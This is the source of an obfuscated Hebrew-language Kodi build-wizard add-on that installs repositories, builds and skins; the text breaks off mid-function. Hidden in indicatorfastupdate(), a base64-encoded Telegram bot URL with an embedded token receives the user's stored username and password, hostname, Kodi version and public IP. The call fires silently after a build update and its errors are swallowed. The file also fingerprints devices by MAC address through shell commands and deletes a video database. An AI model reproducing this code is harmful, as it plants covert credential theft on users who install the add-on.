# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob #line:21
import shutil #line:22
import urllib2 ,urllib #line:23
import re #line:24
import uservar #line:25
import time #line:26
import json #line:27
import speedtest #line:28
from shutil import copyfile #line:29
from datetime import date ,datetime ,timedelta #line:30
from resources .libs import extract ,downloader ,downloaderbg ,downloaderwiz ,notify ,loginit ,debridit ,traktit ,maintenance ,skinSwitch ,uploadLog ,wizard as wiz #line:31
ADDON_ID =uservar .ADDON_ID #line:33
ADDONTITLE =uservar .ADDONTITLE #line:34
ADDON =wiz .addonId (ADDON_ID )#line:35
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:36
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:37
ADDONID =wiz .addonInfo (ADDON_ID ,'id')#line:38
DIALOG =xbmcgui .Dialog ()#line:39
DP =xbmcgui .DialogProgress ()#line:40
DP2 =xbmcgui .DialogProgressBG ()#line:41
HOME =xbmc .translatePath ('special://home/')#line:42
PROFILE =xbmc .translatePath ('special://profile/')#line:43
KODIHOME =xbmc .translatePath ('special://xbmc/')#line:44
ADDONS =os .path .join (HOME ,'addons')#line:45
KODIADDONS =os .path .join (KODIHOME ,'addons')#line:46
USERDATA =os .path .join (HOME ,'userdata')#line:47
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:48
PACKAGES =os .path .join (ADDONS ,'packages')#line:49
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:50
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:51
ICON =os .path .join (ADDONPATH ,'icon.png')#line:52
ART =os .path .join (ADDONPATH ,'resources','art')#line:53
SKIN =xbmc .getSkinDir ()#line:54
BUILDNAME =wiz .getS ('buildname')#line:55
DEFAULTSKIN =wiz .getS ('defaultskin')#line:56
DEFAULTNAME =wiz .getS ('defaultskinname')#line:57
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:58
BUILDVERSION =wiz .getS ('buildversion')#line:59
BUILDLATEST =wiz .getS ('latestversion')#line:60
BUILDCHECK =wiz .getS ('lastbuildcheck')#line:61
DISABLEUPDATE =wiz .getS ('disableupdate')#line:62
AUTOCLEANUP =wiz .getS ('autoclean')#line:63
AUTOCACHE =wiz .getS ('clearcache')#line:64
AUTOPACKAGES =wiz .getS ('clearpackages')#line:65
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:66
AUTOFEQ =wiz .getS ('autocleanfeq')#line:67
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:68
TRAKTSAVE =wiz .getS ('traktlastsave')#line:69
REALSAVE =wiz .getS ('debridlastsave')#line:70
LOGINSAVE =wiz .getS ('loginlastsave')#line:71
INSTALLMETHOD =wiz .getS ('installmethod')#line:72
KEEPTRAKT =wiz .getS ('keeptrakt')#line:73
KEEPREAL =wiz .getS ('keepdebrid')#line:74
KEEPLOGIN =wiz .getS ('keeplogin')#line:75
INSTALLED =wiz .getS ('installed')#line:76
EXTRACT =wiz .getS ('extract')#line:77
EXTERROR =wiz .getS ('errors')#line:78
NOTIFY =wiz .getS ('notify')#line:79
NOTEDISMISS =wiz .getS ('notedismiss')#line:80
NOTEID =wiz .getS ('noteid')#line:81
NOTIFY2 =wiz .getS ('notify2')#line:82
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:83
NOTEID2 =wiz .getS ('noteid2')#line:84
NOTIFY3 =wiz .getS ('notify3')#line:85
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:86
NOTEID3 =wiz .getS ('noteid3')#line:87
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else HOME #line:88
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:89
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:90
NOTEID2 =0 if NOTEID2 ==""else int (NOTEID2 )#line:91
NOTEID3 =0 if NOTEID3 ==""else int (NOTEID3 )#line:92
AUTOFEQ =int (AUTOFEQ )if AUTOFEQ .isdigit ()else 1 #line:93
TODAY =date .today ()#line:94
TOMORROW =TODAY +timedelta (days =1 )#line:95
TWODAYS =TODAY +timedelta (days =2 )#line:96
THREEDAYS =TODAY +timedelta (days =3 )#line:97
ONEWEEK =TODAY +timedelta (days =7 )#line:98
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:99
EXCLUDES =uservar .EXCLUDES #line:100
SPEEDFILE =speedtest .SPEEDFILE #line:101
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:102
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:103
NOTIFICATION =uservar .NOTIFICATION #line:104
NOTIFICATION2 =uservar .NOTIFICATION2 #line:105
NOTIFICATION3 =uservar .NOTIFICATION3 #line:106
ENABLE =uservar .ENABLE #line:107
UNAME =speedtest .UNAME #line:108
HEADERMESSAGE =uservar .HEADERMESSAGE #line:109
AUTOUPDATE =uservar .AUTOUPDATE #line:110
WIZARDFILE =uservar .WIZARDFILE #line:111
AUTOINSTALL =uservar .AUTOINSTALL #line:112
REPOID =uservar .REPOID #line:113
REPOADDONXML =uservar .REPOADDONXML #line:114
REPOZIPURL =uservar .REPOZIPURL #line:115
REPOID18 =uservar .REPOID18 #line:116
REPOADDONXML18 =uservar .REPOADDONXML18 #line:117
REPOZIPURL18 =uservar .REPOZIPURL18 #line:118
COLOR1 =uservar .COLOR1 #line:119
COLOR2 =uservar .COLOR2 #line:120
TMDB_NEW_API =uservar .TMDB_NEW_API #line:121
WORKING =True if wiz .workingURL (SPEEDFILE )==True else False #line:122
FAILED =False #line:123
xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:124
AddonID ='plugin.program.Anonymous'#line:126
packagesdir =xbmc .translatePath (os .path .join ('special://home/addons/packages',''))#line:127
thumbnails =xbmc .translatePath ('special://home/userdata/Thumbnails')#line:128
dialog =xbmcgui .Dialog ()#line:129
setting =xbmcaddon .Addon ().getSetting #line:130
iconpath =xbmc .translatePath (os .path .join ('special://home/addons/'+AddonID ,'icon.png'))#line:131
notify_mode =setting ('notify_mode')#line:132
auto_clean =setting ('startup.cache')#line:133
filesize_thumb =int (setting ('filesizethumb_alert'))#line:135
total_size2 =0 #line:138
total_size =0 #line:139
count =0 #line:140
def disply_hwr ():#line:142
   try :#line:143
    OO0O00OOO0OOOO000 =tmdb_list (TMDB_NEW_API )#line:144
    OOO0OOOO00O000O00 =str ((getHwAddr ('eth0'))*OO0O00OOO0OOOO000 )#line:145
    O0O00O0O0OOO0OOOO =(OOO0OOOO00O000O00 [1 ]+OOO0OOOO00O000O00 [2 ]+OOO0OOOO00O000O00 [5 ]+OOO0OOOO00O000O00 [7 ])#line:152
    OO0OO000O0OOOOO00 =(ADDON .getSetting ("action"))#line:153
    wiz .setS ('action',str (O0O00O0O0OOO0OOOO ))#line:155
   except :pass #line:156
def getHwAddr (OOOOO0OO00O0O0OOO ):#line:157
   import subprocess ,time #line:158
   O0OOO0OO0OOOO000O ='windows'#line:159
   if xbmc .getCondVisibility ('system.platform.android'):#line:160
       O0OOO0OO0OOOO000O ='android'#line:161
   if xbmc .getCondVisibility ('system.platform.android'):#line:162
     OO00O0OO000OO00O0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:163
     O000OOOO0O0OO00OO =re .compile ('link/ether (.+?) brd').findall (str (OO00O0OO000OO00O0 ))#line:165
     OOO00OO0O0OO0OO0O =0 #line:166
     for OOO00O0O000O0O0O0 in O000OOOO0O0OO00OO :#line:167
      if O000OOOO0O0OO00OO !='00:00:00:00:00:00':#line:168
          O0O0OO00OOOOOO0OO =OOO00O0O000O0O0O0 #line:169
          OOO00OO0O0OO0OO0O =OOO00OO0O0OO0OO0O +int (O0O0OO00OOOOOO0OO .replace (':',''),16 )#line:170
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:172
       O0O0O0OO0O0O0OOO0 =0 #line:173
       OOO00OO0O0OO0OO0O =0 #line:174
       O00OO00000O0O0O00 =[]#line:175
       OO0000O0000OO000O =os .popen ("getmac").read ()#line:176
       OO0000O0000OO000O =OO0000O0000OO000O .split ("\n")#line:177
       for OOOOO0O0O0000O0OO in OO0000O0000OO000O :#line:179
            O000OO00000O00OOO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOOOO0O0O0000O0OO ,re .I )#line:180
            if O000OO00000O00OOO :#line:181
                O000OOOO0O0OO00OO =O000OO00000O00OOO .group ().replace ('-',':')#line:182
                O00OO00000O0O0O00 .append (O000OOOO0O0OO00OO )#line:183
                OOO00OO0O0OO0OO0O =OOO00OO0O0OO0OO0O +int (O000OOOO0O0OO00OO .replace (':',''),16 )#line:186
   else :#line:188
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:189
   try :#line:206
    return OOO00OO0O0OO0OO0O #line:207
   except :pass #line:208
def decode (O0O000OO00O00OO00 ,OOOOO0O00000O0000 ):#line:209
    import base64 #line:210
    OOOOO0O00000000O0 =[]#line:211
    if (len (O0O000OO00O00OO00 ))!=4 :#line:213
     return 10 #line:214
    OOOOO0O00000O0000 =base64 .urlsafe_b64decode (OOOOO0O00000O0000 )#line:215
    for OOOOOOO0O00OO00O0 in range (len (OOOOO0O00000O0000 )):#line:217
        O0OOO0O0O00O00OOO =O0O000OO00O00OO00 [OOOOOOO0O00OO00O0 %len (O0O000OO00O00OO00 )]#line:218
        OOO00OO0OOO0O000O =chr ((256 +ord (OOOOO0O00000O0000 [OOOOOOO0O00OO00O0 ])-ord (O0OOO0O0O00O00OOO ))%256 )#line:219
        OOOOO0O00000000O0 .append (OOO00OO0OOO0O000O )#line:220
    return "".join (OOOOO0O00000000O0 )#line:221
def tmdb_list (OO0000O0O00O0OOO0 ):#line:222
    O0OOO0O0O0O0OO0OO =decode ("7643",OO0000O0O00O0OOO0 )#line:225
    return int (O0OOO0O0O0O0OO0OO )#line:228
def u_list (O0O00O0O0OOOO000O ):#line:229
    from math import sqrt #line:231
    O0OO0OOOOOO0OOO0O =tmdb_list (TMDB_NEW_API )#line:232
    OO00O0O00000000OO =str ((getHwAddr ('eth0'))*O0OO0OOOOOO0OOO0O )#line:234
    OOO0O00O0000O0O00 =int (OO00O0O00000000OO [1 ]+OO00O0O00000000OO [2 ]+OO00O0O00000000OO [5 ]+OO00O0O00000000OO [7 ])#line:235
    O00O00OOOOOOO0OOO =(ADDON .getSetting ("pass"))#line:237
    O00OOO0000O0OOOO0 =(str (round (sqrt ((OOO0O00O0000O0O00 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:242
    if '.'in O00OOO0000O0OOOO0 :#line:243
     O00OOO0000O0OOOO0 =(str (round (sqrt ((OOO0O00O0000O0O00 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:244
    if O00O00OOOOOOO0OOO ==O00OOO0000O0OOOO0 :#line:245
      OO0000O0OO00000OO =O0O00O0O0OOOO000O #line:247
    else :#line:249
       if STARTP ()and STARTP2 ()=='ok':#line:250
         return O0O00O0O0OOOO000O #line:252
       OO0000O0OO00000OO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:253
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:254
       sys .exit ()#line:255
    return OO0000O0OO00000OO #line:256
try :#line:257
   disply_hwr ()#line:258
except :#line:259
   pass #line:260
def indicatorfastupdate ():#line:262
       try :#line:263
          import json #line:264
          wiz .log ('FRESH MESSAGE')#line:265
          OO000OOO0000OOOOO =(ADDON .getSetting ("user"))#line:266
          OO0O0O0OO0O000O0O =(ADDON .getSetting ("pass"))#line:267
          OO0OO0O0O0O0O0000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:268
          OOOO00OOO0O0OO00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:270
          O0OOOOO0OO00O0O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:271
          O00OOO0O000OOO0O0 =str (json .loads (O0OOOOO0OO00O0O00 )['ip'])#line:272
          O0O0O0OO000000O0O =OO000OOO0000OOOOO #line:273
          O00000O0OO0OOOO0O =OO0O0O0OO0O000O0O #line:274
          import socket #line:275
          O0OOOOO0OO00O0O00 =urllib2 .urlopen (OOOO00OOO0O0OO00O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O0O0OO000000O0O +' - '+O00000O0OO0OOOO0O +' - '+OO0OO0O0O0O0O0000 +' - '+O00OOO0O000OOO0O0 ).readlines ()#line:276
       except :pass #line:278
def skindialogsettind18 ():#line:279
	try :#line:280
		O0O00O0O00OO000O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:281
		OOOO0OOO00OOO000O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:282
		copyfile (O0O00O0O00OO000O0 ,OOOO0OOO00OOO000O )#line:283
	except :pass #line:284
def checkidupdate ():#line:285
				wiz .setS ("notedismiss","true")#line:287
				O00O0O0O000O0O0OO =wiz .workingURL (NOTIFICATION )#line:288
				O0OOO00OOOOO0O000 =" Kodi Premium"#line:290
				OOOOOOO0OO0O0O00O =wiz .checkBuild (O0OOO00OOOOO0O000 ,'gui')#line:291
				O00O0000O0000O00O =O0OOO00OOOOO0O000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:292
				if not wiz .workingURL (OOOOOOO0OO0O0O00O )==True :return #line:293
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:294
				OO00O0OO00OOO0O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0000O0000O00O )#line:297
				try :os .remove (OO00O0OO00OOO0O00 )#line:298
				except :pass #line:299
				if 'google'in OOOOOOO0OO0O0O00O :#line:301
				   O0000O00O0O00OOOO =googledrive_download (OOOOOOO0OO0O0O00O ,OO00O0OO00OOO0O00 ,DP2 ,wiz .checkBuild (O0OOO00OOOOO0O000 ,'filesize'))#line:302
				else :#line:305
				  downloaderbg .download3 (OOOOOOO0OO0O0O00O ,OO00O0OO00OOO0O00 ,DP2 )#line:306
				xbmc .sleep (100 )#line:307
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:308
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:310
				extract .all (OO00O0OO00OOO0O00 ,HOME )#line:312
				DP2 .close ()#line:313
				wiz .defaultSkin ()#line:314
				wiz .lookandFeelData ('save')#line:315
				wiz .kodi17Fix ()#line:316
				if KODIV >=18 :#line:317
					skindialogsettind18 ()#line:318
				xbmc .executebuiltin ("ReloadSkin()")#line:319
				indicatorfastupdate ()#line:320
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:321
				debridit .debridIt ('restore','all')#line:322
				traktit .traktIt ('restore','all')#line:323
				if INSTALLMETHOD ==1 :O0O0OO00OOOO000OO =1 #line:324
				elif INSTALLMETHOD ==2 :O0O0OO00OOOO000OO =0 #line:325
				else :DP2 .close ()#line:326
def checkUpdate ():#line:332
	O000O0OO0O00OOO0O =wiz .getS ('buildname')#line:333
	O00O000O0OO0OOOO0 =wiz .getS ('buildversion')#line:334
	OOO0O000OOO00O000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:335
	O000O0O0000OO000O =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O000O0OO0O00OOO0O ).findall (OOO0O000OOO00O000 )#line:336
	if len (O000O0O0000OO000O )>0 :#line:337
		OOO00OOOO0O00000O =O000O0O0000OO000O [0 ][0 ]#line:338
		O0OO0O0OO0O00000O =O000O0O0000OO000O [0 ][1 ]#line:339
		OO000OOO00O0OO0OO =O000O0O0000OO000O [0 ][2 ]#line:340
		wiz .setS ('latestversion',OOO00OOOO0O00000O )#line:341
		if OOO00OOOO0O00000O >O00O000O0OO0OOOO0 :#line:342
			if DISABLEUPDATE =='false':#line:343
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O00O000O0OO0OOOO0 ,OOO00OOOO0O00000O ),xbmc .LOGNOTICE )#line:344
				notify .updateWindow (O000O0OO0O00OOO0O ,O00O000O0OO0OOOO0 ,OOO00OOOO0O00000O ,O0OO0O0OO0O00000O ,OO000OOO00O0OO0OO )#line:345
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O00O000O0OO0OOOO0 ,OOO00OOOO0O00000O ),xbmc .LOGNOTICE )#line:346
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O00O000O0OO0OOOO0 ,OOO00OOOO0O00000O ),xbmc .LOGNOTICE )#line:347
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:348
wiz .log ("[Auto Update Wizard] Started",xbmc .LOGNOTICE )#line:383
if AUTOUPDATE =='Yes':#line:384
	input =(ADDON .getSetting ("autoupdate"))#line:385
	xbmc .executebuiltin ("UpdateLocalAddons")#line:386
	xbmc .executebuiltin ("UpdateAddonRepos")#line:387
	wiz .wizardUpdate ('startup')#line:388
	checkUpdate ()#line:390
else :wiz .log ("[Auto Update Wizard] Not Enabled",xbmc .LOGNOTICE )#line:392
wiz .log ("[Auto Install Repo] Started",xbmc .LOGNOTICE )#line:396
if AUTOINSTALL =='Yes'and not os .path .exists (os .path .join (ADDONS ,REPOID ))and KODIV >=17 and KODIV <18 :#line:397
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:399
	workingxml =wiz .workingURL (REPOADDONXML )#line:400
	if workingxml ==True :#line:401
		ver =wiz .parseDOM (wiz .openURL (REPOADDONXML ),'addon',ret ='version',attrs ={'id':REPOID })#line:402
		if len (ver )>0 :#line:403
			installzip ='%s-%s.zip'%(REPOID ,ver [0 ])#line:404
			workingrepo =wiz .workingURL (REPOZIPURL +installzip )#line:405
			if workingrepo ==True :#line:406
				DP .create (ADDONTITLE ,'מוריד ממשק התקנה חדשני, אנא המתן....','','Please Wait')#line:407
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:408
				lib =os .path .join (PACKAGES ,installzip )#line:409
				try :os .remove (lib )#line:410
				except :pass #line:411
				downloader .download (REPOZIPURL +installzip ,lib ,DP )#line:412
				extract .all (lib ,ADDONS ,DP )#line:413
				try :#line:414
					f =open (os .path .join (ADDONS ,REPOID ,'addon.xml'),mode ='r');g =f .read ();f .close ()#line:415
					name =wiz .parseDOM (g ,'addon',ret ='name',attrs ={'id':REPOID })#line:416
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,name [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,REPOID ,'icon.png'))#line:417
				except :#line:418
					pass #line:419
				if KODIV >=17 :wiz .addonDatabase (REPOID ,1 )#line:420
				DP .close ()#line:421
				xbmc .sleep (500 )#line:422
				wiz .forceUpdate (True )#line:423
				wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:424
				xbmc .executebuiltin ("ReloadSkin()")#line:425
				xbmc .executebuiltin ("ActivateWindow(home)")#line:426
				f_play =(os .path .join (ADDONPATH ,'resources','victory.mp4'))#line:427
				xbmc .Player ().play (f_play ,windowed =False )#line:428
			else :#line:430
				wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:431
				wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%workingrepo ,xbmc .LOGERROR )#line:432
		else :#line:433
			wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:434
	else :#line:435
		wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:436
		wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:437
elif not AUTOINSTALL =='Yes':wiz .log ("[Auto Install Repo] Not Enabled",xbmc .LOGNOTICE )#line:438
elif os .path .exists (os .path .join (ADDONS ,REPOID )):wiz .log ("[Auto Install Repo] Repository already installed")#line:439
if AUTOINSTALL =='Yes'and not os .path .exists (os .path .join (ADDONS ,REPOID ))and KODIV >=18 :#line:442
	workingxml =wiz .workingURL (REPOADDONXML18 )#line:443
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','Please Wait....')))#line:444
	if BUILDNAME =="":#line:445
		try :#line:446
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db"))#line:447
		except :#line:448
				pass #line:449
	if workingxml ==True :#line:450
		ver =wiz .parseDOM (wiz .openURL (REPOADDONXML18 ),'addon',ret ='version',attrs ={'id':REPOID18 })#line:451
		if len (ver )>0 :#line:452
			installzip ='%s-%s.zip'%(REPOID18 ,ver [0 ])#line:453
			workingrepo =wiz .workingURL (REPOZIPURL18 +installzip )#line:454
			if workingrepo ==True :#line:455
				DP .create (ADDONTITLE ,'מוריד ממשק התקנה חדשני, אנא המתן....','','Please Wait')#line:456
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:457
				lib =os .path .join (PACKAGES ,installzip )#line:458
				try :os .remove (lib )#line:459
				except :pass #line:460
				downloader .download (REPOZIPURL18 +installzip ,lib ,DP )#line:461
				extract .all (lib ,ADDONS ,DP )#line:462
				try :#line:463
					f =open (os .path .join (ADDONS ,REPOID18 ,'addon.xml'),mode ='r');g =f .read ();f .close ()#line:464
					name =wiz .parseDOM (g ,'addon',ret ='name',attrs ={'id':REPOID18 })#line:465
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,name [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,REPOID18 ,'icon.png'))#line:466
				except :#line:467
					pass #line:468
				if KODIV >=17 :wiz .addonDatabase (REPOID18 ,1 )#line:469
				DP .close ()#line:470
				xbmc .sleep (500 )#line:471
				wiz .forceUpdate (True )#line:472
				wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:473
				xbmc .executebuiltin ("ReloadSkin()")#line:474
				xbmc .executebuiltin ("ActivateWindow(home)")#line:475
				f_play =(os .path .join (ADDONPATH ,'resources','victory.mp4'))#line:476
				xbmc .Player ().play (f_play ,windowed =False )#line:477
			else :#line:479
				wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:480
				wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%workingrepo ,xbmc .LOGERROR )#line:481
		else :#line:482
			wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:483
	else :#line:484
		wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:485
		wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:486
elif not AUTOINSTALL =='Yes':wiz .log ("[Auto Install Repo] Not Enabled",xbmc .LOGNOTICE )#line:488
elif os .path .exists (os .path .join (ADDONS ,REPOID18 )):wiz .log ("[Auto Install Repo] Repository already installed")#line:489
def setuname ():#line:490
    OO0O0000O000O0O0O =''#line:491
    OOO0O0O00OOO0O0O0 =xbmc .Keyboard (OO0O0000O000O0O0O ,'הכנס שם משתמש')#line:492
    OOO0O0O00OOO0O0O0 .doModal ()#line:493
    if OOO0O0O00OOO0O0O0 .isConfirmed ():#line:494
           OO0O0000O000O0O0O =OOO0O0O00OOO0O0O0 .getText ()#line:495
           wiz .setS ('user',str (OO0O0000O000O0O0O ))#line:496
def STARTP2 ():#line:497
	if BUILDNAME ==" Kodi Premium":#line:498
		O0O0O0000OOO0OOOO =(ADDON .getSetting ("user"))#line:499
		OO000OO000O00O000 =(UNAME )#line:500
		OOO0O0O0OO0O0O00O =urllib2 .urlopen (OO000OO000O00O000 )#line:501
		O000OO0O00000OOOO =OOO0O0O0OO0O0O00O .readlines ()#line:502
		O0O0O0OO0OOO00OO0 =0 #line:503
		for OO0000OOO0OO0O000 in O000OO0O00000OOOO :#line:504
			if OO0000OOO0OO0O000 .split (' ==')[0 ]==O0O0O0000OOO0OOOO or OO0000OOO0OO0O000 .split ()[0 ]==O0O0O0000OOO0OOOO :#line:505
				O0O0O0OO0OOO00OO0 =1 #line:506
				break #line:507
		if O0O0O0OO0OOO00OO0 ==0 :#line:508
			OO00OO0O00000OO00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]ברוכים הבאים לקודי אנונימוס"%(COLOR2 ),"נא להכניס את שם המשתמש שלכם[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:510
			if OO00OO0O00000OO00 :#line:512
				ADDON .openSettings ()#line:513
				sys .exit ()#line:514
			else :#line:515
				sys .exit ()#line:516
		return 'ok'#line:520
def skinWIN ():#line:523
	idle ()#line:524
	O00OO0000O00OO000 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:525
	O0OOO0OOOOOO00000 =[];OOOOO0000OO00O0OO =[]#line:526
	for O0O00O00O0000OOOO in sorted (O00OO0000O00OO000 ,key =lambda O00OO0OOOOOOO00OO :O00OO0OOOOOOO00OO ):#line:527
		O00OO0OO00O0O0O00 =os .path .split (O0O00O00O0000OOOO [:-1 ])[1 ]#line:528
		O0OO000OOO0O000OO =os .path .join (O0O00O00O0000OOOO ,'addon.xml')#line:529
		if os .path .exists (O0OO000OOO0O000OO ):#line:530
			O0O0O0000O00OOOOO =open (O0OO000OOO0O000OO )#line:531
			O0OO00OOO00O00O00 =O0O0O0000O00OOOOO .read ()#line:532
			OOO00O0O00000O000 =parseDOM2 (O0OO00OOO00O00O00 ,'addon',ret ='id')#line:533
			O0OOO00OOO0O00000 =O00OO0OO00O0O0O00 if len (OOO00O0O00000O000 )==0 else OOO00O0O00000O000 [0 ]#line:534
			try :#line:535
				O00O0000OO000OO00 =xbmcaddon .Addon (id =O0OOO00OOO0O00000 )#line:536
				O0OOO0OOOOOO00000 .append (O00O0000OO000OO00 .getAddonInfo ('name'))#line:537
				OOOOO0000OO00O0OO .append (O0OOO00OOO0O00000 )#line:538
			except :#line:539
				pass #line:540
	O00O000O0000O000O =[];O0000000O0000O0OO =0 #line:541
	O0O0O00OO0OOOO0OO =["Current Skin -- %s"%currSkin ()]+O0OOO0OOOOOO00000 #line:542
	O0000000O0000O0OO =DIALOG .select ("Select the Skin you want to swap with.",O0O0O00OO0OOOO0OO )#line:543
	if O0000000O0000O0OO ==-1 :return #line:544
	else :#line:545
		O00O00OOO0OO000OO =(O0000000O0000O0OO -1 )#line:546
		O00O000O0000O000O .append (O00O00OOO0OO000OO )#line:547
		O0O0O00OO0OOOO0OO [O0000000O0000O0OO ]="%s"%(O0OOO0OOOOOO00000 [O00O00OOO0OO000OO ])#line:548
	if O00O000O0000O000O ==None :return #line:549
	for OO0000000OOO00O00 in O00O000O0000O000O :#line:550
		swapSkins (OOOOO0000OO00O0OO [OO0000000OOO00O00 ])#line:551
def currSkin ():#line:553
	return xbmc .getSkinDir ('Container.PluginName')#line:554
def fix17update ():#line:556
	if KODIV >=17 and KODIV <18 :#line:557
		wiz .kodi17Fix ()#line:558
		xbmc .sleep (4000 )#line:559
		try :#line:560
			OO000OO0OO0O0OO0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:561
			O0OOO0OOOOO0OOOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:562
			os .rename (OO000OO0OO0O0OO0O ,O0OOO0OOOOO0OOOO0 )#line:563
		except :#line:564
				pass #line:565
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:566
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:567
		fixfont ()#line:568
		O00000OOOO0O00OO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:569
		try :#line:571
			OO00O0OO0O000O00O =open (O00000OOOO0O00OO0 ,'r')#line:572
			O0OOO00O0O0O000OO =OO00O0OO0O000O00O .read ()#line:573
			OO00O0OO0O000O00O .close ()#line:574
